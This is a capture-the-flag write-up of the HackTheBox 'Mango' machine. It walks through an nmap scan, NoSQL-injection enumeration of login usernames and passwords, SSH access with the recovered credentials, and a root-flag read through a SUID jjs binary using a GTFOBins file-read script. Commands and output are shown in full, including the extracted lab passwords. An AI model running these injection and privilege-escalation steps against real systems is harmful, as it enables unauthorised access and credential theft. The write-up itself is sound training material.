# Mango

## OS: Linux

## IP: 10.10.10.162 


### Enumeration

Let's kick it off with a standard `nmap` scan.

```bash
# Nmap 7.80 scan initiated Fri Apr  3 11:04:08 2020 as: nmap -vvv -sCV -oN enumeration/nmap 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up, received syn-ack (0.22s latency).
Scanned at 2020-04-03 11:04:08 CDT for 71s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXYCdNRHET98F1ZTM+H8yrD9KXeRjvIk9e78JkHdzcqCq6zcvYIqEZReb3FSCChJ9mxK6E6vu5xBY7R6Gi0V31dx0koyaieEMd67PU+9UcjaAujbDS3UgYzySN+c5GV/ssmA6wWHu4zz+k+qztqdYFPh0/TgrC/wNPWHOKdpivgoyk3+F/retyGdKUNGjypXrw6v1faHiLOIO+zNHorxB304XmSLEFswiOS8UsjplIbud2KhWPEkY4s4FyjlpfpVdgPljbjijm7kcPNgpTXLXE51oNE3Q5w7ufO5ulo3Pqm0x+4d+SEpCE4g0+Yb020zK+JlKsp2tFJyLqTLan1buN
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqSZ4iBMzBrw2lEFKYlwO2qmw0WPf76ZhnvWGK+LJcHxvNa4OQ/hGuBWCjVlTcMbn1Te7D8jGwPgbcVpuaEld8=
|   256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB1sFdLYacK+1f4J+i+NCAhG+bj8xzzydNhqA1Ndo/xt
80/tcp  open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/emailAddress=admin@mango.htb/organizationalUnitName=None
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/emailAddress=admin@mango.htb/organizationalUnitName=None
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
| SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
| -----BEGIN CERTIFICATE-----
| MIIEAjCCAuqgAwIBAgIJAK5QiSmoBvEyMA0GCSqGSIb3DQEBCwUAMIGVMQswCQYD
| VQQGEwJJTjENMAsGA1UECAwETm9uZTENMAsGA1UEBwwETm9uZTEXMBUGA1UECgwO
| TWFuZ28gUHJ2IEx0ZC4xDTALBgNVBAsMBE5vbmUxIDAeBgNVBAMMF3N0YWdpbmct
| b3JkZXIubWFuZ28uaHRiMR4wHAYJKoZIhvcNAQkBFg9hZG1pbkBtYW5nby5odGIw
| HhcNMTkwOTI3MTQyMTE5WhcNMjAwOTI2MTQyMTE5WjCBlTELMAkGA1UEBhMCSU4x
| DTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUxFzAVBgNVBAoMDk1hbmdvIFBy
| diBMdGQuMQ0wCwYDVQQLDAROb25lMSAwHgYDVQQDDBdzdGFnaW5nLW9yZGVyLm1h
| bmdvLmh0YjEeMBwGCSqGSIb3DQEJARYPYWRtaW5AbWFuZ28uaHRiMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5fimSfgq3xsdUkZ6dcbqGPDmCAJJBOK2
| f5a25At3Ht5r1SjiIuvovDSmMHjVmlbF6qX7C6f7Um+1Vtv/BinZfpuMEesyDH0V
| G/4X5r6o1GMfrvjvAXQ2cuVEIxHGH17JM6gKKEppnguFwVMhC4/KUIjuaBXX9udA
| 9eaFJeiYEpdfSUVysoxQDdiTJhwyUIPnsFrf021nVOI1/TJkHAgLzxl1vxrMnwrL
| 2fLygDt1IQN8UhGF/2UTk3lVfEse2f2kvv6GbmjxBGfWCNA/Aj810OEGVMiS5SLr
| arIXCGVl953QCD9vi+tHB/c+ICaTtHd0Ziu/gGbdKdCItND1r9kOEQIDAQABo1Mw
| UTAdBgNVHQ4EFgQUha2bBOZXo4EyfovW+pvFLGVWBREwHwYDVR0jBBgwFoAUha2b
| BOZXo4EyfovW+pvFLGVWBREwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsF
| AAOCAQEAmyhYweHz0az0j6UyTYlUAUKY7o/wBHE55UcekmWi0XVdIseUxBGZasL9
| HJki3dQ0mOEW4Ej28StNiDKPvWJhTDLA1ZjUOaW2Jg20uDcIiJ98XbdBvSgjR6FJ
| JqtPYnhx7oOigKsBGYXXYAxoiCFarcyPyB7konNuXUqlf7iz2oLl/FsvJEl+YMgZ
| YtrgOLbEO6/Lot/yX9JBeG1z8moJ0g+8ouCbUYI1Xcxipp0Cp2sK1nrfHEPaSjBB
| Os2YQBdvVXJau7pt9zJmPVMhrLesf+bW5CN0WpC/AE1M1j6AfkX64jKpIMS6KAUP
| /UKaUcFaDwjlaDEvbXPdwpmk4vVWqg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr  3 11:05:19 2020 -- 1 IP address (1 host up) scanned in 71.51 seconds
```

Ports 22, 80, and 443 are open. `ssh` is worth a shot after exploring the website. `HTTP` (80) gives me an error, but `HTTPS` gives me an SSL warning. Clicking through to view the SSL certificate reveals the common name: `staging-order.mango.htb`. Let's add this to `/etc/hosts` under a `10.10.10.162` entry, along with `mango.htb`.

```bash
$ cat /etc/hosts

127.0.0.1	localhost
127.0.1.1	alichtman-kali.attlocal.net	alichtman-kali
10.10.10.162    staging-order.mango.htb mango.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, navigating to `staging-order.mango.htb` brings us to a login page. We try some basic `SQL` injections like `admin' or ''='` for the username and password, but have no luck. It might be a `NoSQL` database instead. 

We'll use [`no-sqli-user-pass-enum`](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) to enumerate the usernames and passwords. In the following command, `-u` specifies the URL and protocol, `-up` is the username parameter in the database, and `-pp` is the password parameter in the database. Common values are `username` and `user`, and `password` and `pass`, respectively. `-ep` is the enumeration parameter. This tells the tool which parameter to enumerate. And `-m` is the method of the form. 


```bash
$ python nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username -pp password -ep username -m POST
No pattern starts with '0'
No pattern starts with '1'
No pattern starts with '2'
No pattern starts with '3'
No pattern starts with '4'
No pattern starts with '5'
No pattern starts with '6'
No pattern starts with '7'
No pattern starts with '8'
No pattern starts with '9'
Pattern found that starts with 'a'
Pattern found: ad
Pattern found: adm
Pattern found: admi
Pattern found: admin
username found: admin
No pattern starts with 'b'
No pattern starts with 'c'
No pattern starts with 'd'
No pattern starts with 'e'
No pattern starts with 'f'
No pattern starts with 'g'
No pattern starts with 'h'
No pattern starts with 'i'
No pattern starts with 'j'
No pattern starts with 'k'
No pattern starts with 'l'
Pattern found that starts with 'm'
Pattern found: ma
Pattern found: man
Pattern found: mang
Pattern found: mango
username found: mango
No pattern starts with 'n'
No pattern starts with 'o'
No pattern starts with 'p'
No pattern starts with 'q'
No pattern starts with 'r'
No pattern starts with 's'
No pattern starts with 't'
No pattern starts with 'u'
No pattern starts with 'v'
No pattern starts with 'w'
No pattern starts with 'x'
No pattern starts with 'y'
No pattern starts with 'z'
No pattern starts with 'A'
No pattern starts with 'B'
No pattern starts with 'C'
No pattern starts with 'D'
No pattern starts with 'E'
No pattern starts with 'F'
No pattern starts with 'G'
No pattern starts with 'H'
No pattern starts with 'I'
No pattern starts with 'J'
No pattern starts with 'K'
No pattern starts with 'L'
No pattern starts with 'M'
No pattern starts with 'N'
No pattern starts with 'O'
No pattern starts with 'P'
No pattern starts with 'Q'
No pattern starts with 'R'
No pattern starts with 'S'
No pattern starts with 'T'
No pattern starts with 'U'
No pattern starts with 'V'
No pattern starts with 'W'
No pattern starts with 'X'
No pattern starts with 'Y'
No pattern starts with 'Z'
No pattern starts with '!'
No pattern starts with '"'
No pattern starts with '#'
No pattern starts with '%'
No pattern starts with '''
No pattern starts with '('
No pattern starts with ')'
No pattern starts with ','
No pattern starts with '-'
No pattern starts with '/'
No pattern starts with ':'
No pattern starts with ';'
No pattern starts with '<'
No pattern starts with '='
No pattern starts with '>'
No pattern starts with '@'
No pattern starts with '['
No pattern starts with ']'
No pattern starts with '_'
No pattern starts with '`'
No pattern starts with '{'
No pattern starts with '}'
No pattern starts with '~'
No pattern starts with ' '
No pattern starts with '        '
No pattern starts with '
'
'o pattern starts with '
No pattern starts with '
                        '
No pattern starts with '
                        '

2 username(s) found:
admin
mango

$ python nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username -pp password -ep password -m POST
No pattern starts with '0'
No pattern starts with '1'
No pattern starts with '2'
No pattern starts with '3'
No pattern starts with '4'
No pattern starts with '5'
No pattern starts with '6'
No pattern starts with '7'
No pattern starts with '8'
No pattern starts with '9'
No pattern starts with 'a'
No pattern starts with 'b'
No pattern starts with 'c'
No pattern starts with 'd'
No pattern starts with 'e'
No pattern starts with 'f'
No pattern starts with 'g'
Pattern found that starts with 'h'
Pattern found: h3
Pattern found: h3m
Pattern found: h3mX
Pattern found: h3mXK
Pattern found: h3mXK8
Pattern found: h3mXK8R
Pattern found: h3mXK8Rh
Pattern found: h3mXK8RhU
Pattern found: h3mXK8RhU~
Pattern found: h3mXK8RhU~f
Pattern found: h3mXK8RhU~f{
Pattern found: h3mXK8RhU~f{]
Pattern found: h3mXK8RhU~f{]f
Pattern found: h3mXK8RhU~f{]f5
Pattern found: h3mXK8RhU~f{]f5H
password found: h3mXK8RhU~f{]f5H
No pattern starts with 'i'
No pattern starts with 'j'
No pattern starts with 'k'
No pattern starts with 'l'
No pattern starts with 'm'
No pattern starts with 'n'
No pattern starts with 'o'
No pattern starts with 'p'
No pattern starts with 'q'
No pattern starts with 'r'
No pattern starts with 's'
Pattern found that starts with 't'
Pattern found: t9
Pattern found: t9K
Pattern found: t9Kc
Pattern found: t9KcS
Pattern found: t9KcS3
Pattern found: t9KcS3>
Pattern found: t9KcS3>!
Pattern found: t9KcS3>!0
Pattern found: t9KcS3>!0B
Pattern found: t9KcS3>!0B#
Pattern found: t9KcS3>!0B#2
password found: t9KcS3>!0B#2
No pattern starts with 'u'
No pattern starts with 'v'
No pattern starts with 'w'
No pattern starts with 'x'
No pattern starts with 'y'
No pattern starts with 'z'
No pattern starts with 'A'
No pattern starts with 'B'
No pattern starts with 'C'
No pattern starts with 'D'
No pattern starts with 'E'
No pattern starts with 'F'
No pattern starts with 'G'
No pattern starts with 'H'
No pattern starts with 'I'
No pattern starts with 'J'
No pattern starts with 'K'
No pattern starts with 'L'
No pattern starts with 'M'
No pattern starts with 'N'
No pattern starts with 'O'
No pattern starts with 'P'
No pattern starts with 'Q'
No pattern starts with 'R'
No pattern starts with 'S'
No pattern starts with 'T'
No pattern starts with 'U'
No pattern starts with 'V'
No pattern starts with 'W'
No pattern starts with 'X'
No pattern starts with 'Y'
No pattern starts with 'Z'
No pattern starts with '!'
No pattern starts with '"'
No pattern starts with '#'
No pattern starts with '%'
No pattern starts with '''
No pattern starts with '('
No pattern starts with ')'
No pattern starts with ','
No pattern starts with '-'
No pattern starts with '/'
No pattern starts with ':'
No pattern starts with ';'
No pattern starts with '<'
No pattern starts with '='
No pattern starts with '>'
No pattern starts with '@'
No pattern starts with '['
No pattern starts with ']'
No pattern starts with '_'
No pattern starts with '`'
No pattern starts with '{'
No pattern starts with '}'
No pattern starts with '~'
No pattern starts with ' '
No pattern starts with '        '
No pattern starts with '
'
'o pattern starts with '
No pattern starts with '
                        '
No pattern starts with '
                        '

2 password(s) found:
h3mXK8RhU~f{]f5H
t9KcS3>!0B#2
```

So we've got two usernames: `admin` and `mango`, and two passwords: `h3mXK8RhU~f{]f5H` and `t9KcS3>!0B#2`.

Let's just try logging in? The combination `admin` and `t9KcS3>!0B#2` works. We see a notice to email them as the site is under construction. The email given is: `admin@mango.htb`, so maybe there's a mailserver we can target? Just to be thorough, I checked the combination `mango` and `h3mXK8RhU~f{]f5H` and saw the same page.

I ran `$ dig mango.htb` and `$ dig staging-order.mango.htb` to try to find a mailserver, but had no luck. Then I remembered that port 22 is open, so what if we just `ssh` into the machine?

```bash
$ ssh admin@10.10.10.192 # Password: t9KcS3>!0B#2
# Login Failure

$ ssh mango@10.10.10.162
mango@10.10.10.162's password: # h3mXK8RhU~f{]f5H
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Apr  4 14:03:44 UTC 2020

  System load:  0.0                Processes:            100
  Usage of /:   24.8% of 19.56GB   Users logged in:      0
  Memory usage: 29%                IP address for ens33: 10.10.10.162
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.


Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138
mango@mango:~$ cd home/admin
mango@mango:/home/admin$ ls
user.txt
mango@mango:/home/admin$ cat user.txt
cat: user.txt: Permission denied
$ su - admin
Password:
$ ls
user.txt
$ whoami
admin
$ wc user.txt
 1  1 33 user.txt
```

I now have the user flag after escalating privileges from `mango` to `admin`. Now we need to get `root`. Let's throw up a server and move `LinEnum.sh` over to the target, make it executable and run it. The output is available in the `enumeration/LinEnum.output.txt` file.

These two lines in the `LinEnum.sh` output stick out to me. Now that we have `admin` privileges, we can run `jjs`.


```
[+] Possibly interesting SUID files:
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

...

[+] Possibly interesting SGID files:
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Let's check `GTFObins` to see if we can do anything cool with `jjs`. It seems like there is an [arbitrary file read](https://gtfobins.github.io/gtfobins/jjs/#file-read) vulnerability with `jjs`. Let's try modifying that code to grab the root flag.

```bash
$ echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
while ((line = br.readLine()) != null) { print(line); }' | jjs

jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
8a8ef***************************
```

And that's the box!
